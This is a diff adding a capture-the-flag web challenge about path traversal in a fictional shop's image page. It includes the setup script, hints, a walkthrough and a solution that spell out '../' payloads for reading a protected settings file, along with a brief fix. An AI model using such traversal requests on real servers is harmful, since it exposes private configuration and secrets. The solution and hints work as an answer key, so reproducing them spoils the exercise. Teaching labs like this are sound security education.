@@ -1,0 +1,66 @@
+title: Pictures from anywhere
+category: web
+level: Intermediate
+kind: Web
+topic: Access control
+teaser: the picture page joins your file name to its folder - dots and all
+points: 60
+order: 3
+packages: httpd
+answer: flag
+var: CONF = pick:shop.conf|settings.ini|copperleaf.cfg|site.conf
+var: PIC = pick:tent.png|kettle.png|socks.png|lantern.png
+
+@intro
+Product pictures at Copperleaf Market come from a little page:
+
+    http://copperleaf.example/image?file={{PIC}}
+
+It reads the file from the shop's picture folder, /var/www/shop/images. The shop's
+own settings live in /etc/copperleaf/{{CONF}} - a file only the web server's account
+may read (you, on this box, can't). Make the picture page read it for you. The flag
+is inside.
+
+@setup
+systemctl enable --now httpd
+echo '127.0.0.1 copperleaf.example' >> /etc/hosts
+mkdir -p /var/www/shop/images /etc/copperleaf
+for p in tent kettle socks lantern; do printf 'PNG (a pretend picture of a %s)\n' $p > /var/www/shop/images/$p.png; done
+printf '# Copperleaf Market settings\ndb_path=/var/lib/copperleaf/shop.db\nmail_relay=mail.copperleaf.example\nstaff_code=%s\n' '{{FLAG}}' > /etc/copperleaf/{{CONF}}
+chown -R apache:apache /etc/copperleaf /var/www/shop
+chmod 700 /etc/copperleaf
+chmod 600 /etc/copperleaf/{{CONF}}
+
+@web
+[ { "path": "/", "kind": "shop", "settings": { "flag": "{{FLAG}}", "weak": "traversal" } } ]
+
+@solution
+curl -s "http://copperleaf.example/image?file={{PIC}}"
+cat /etc/copperleaf/{{CONF}}
+curl -s "http://copperleaf.example/image?file=../{{CONF}}"
+curl -s "http://copperleaf.example/image?file=../../../../etc/copperleaf/{{CONF}}"
+
+@walkthrough
+The page adds whatever you give it to the end of /var/www/shop/images/. In a path,
+.. means "the folder above", and the page doesn't remove it. Counting the folders:
+images -> shop -> www -> var -> / is four steps up, so
+
+    ../../../../etc/copperleaf/{{CONF}}
+
+joined to /var/www/shop/images/ lands on /etc/copperleaf/{{CONF}}:
+
+    curl -s "http://copperleaf.example/image?file=../../../../etc/copperleaf/{{CONF}}"
+
+The web server's account can read the file, so the page sends it to you - that is
+path traversal. (A wrong number of ../ gives "No such picture" with the path it
+tried, which helps you count; extra ../ at / just stay at /.) The fix: turn the name
+into a full path and refuse it unless it is still inside the picture folder.
+
+@hint 5
+Ask for a picture normally first, then think about what the page does with the name: folder + "/" + your name. What does .. mean in a path?
+
+@hint 10
+.. means "go up one folder". From /var/www/shop/images you need to climb back to / and then go down into /etc/copperleaf. The error page shows the full path the shop tried, so you can check your counting.
+
+@hint 18
+Four ../ take you from /var/www/shop/images to /. Try file=../../../../etc/copperleaf/{{CONF}} (keep the address in quotes).
